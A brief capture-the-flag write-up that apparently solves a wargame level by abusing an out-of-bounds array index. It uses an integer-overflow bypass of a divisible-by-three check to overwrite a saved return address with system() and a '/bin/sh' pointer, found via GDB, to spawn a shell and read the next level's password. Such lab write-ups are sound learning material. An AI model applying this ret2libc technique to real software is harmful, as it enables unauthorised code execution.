the programm (see source) lets us store and read numbers. it stores them in a massive but we can put any index and go outside of it
there is a number of limitations for indexes, the only important one is that it can not be divided by 3
we can calculate the indexes to change the return pointer to system and its argument to "bin/sh"

lets set a break at the beginning of the read_number funtion
b *0x080486dd
x/x $ebp+0x8 - 0xffffd504
the address of our storage inside read number function - we can count from it

now we need a break at main
b *0x08048723
info frame to find that 0xffffd6cc is return pointer address that contains 0xf7e45513 for now
we can calculate the index to change this!
0xffffd6cc - 0xffffd504 = 4294956748 - 4294956292 = 456 (/4 = 114)
unfortunately this value is protected (dividable on 3) but we can overflow the int with (4294967296 / 4 ) + 114 = 1073741938 - this one %3 = 1
we can take addresses of system and /bin/sh from previous levels or find them again:
info function system
0xf7e6aed0 = 4159090384 in decimal

info proc map 
find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec = 4160264172 in decimal

116 for index now - 2 pointers higher (old frame pointer is untouched inbetween)

now we just store the number 4159090384 for index 1073741938 and 4160264172 for index 116 and quit

go to the level08 folder and check flag in .pass!
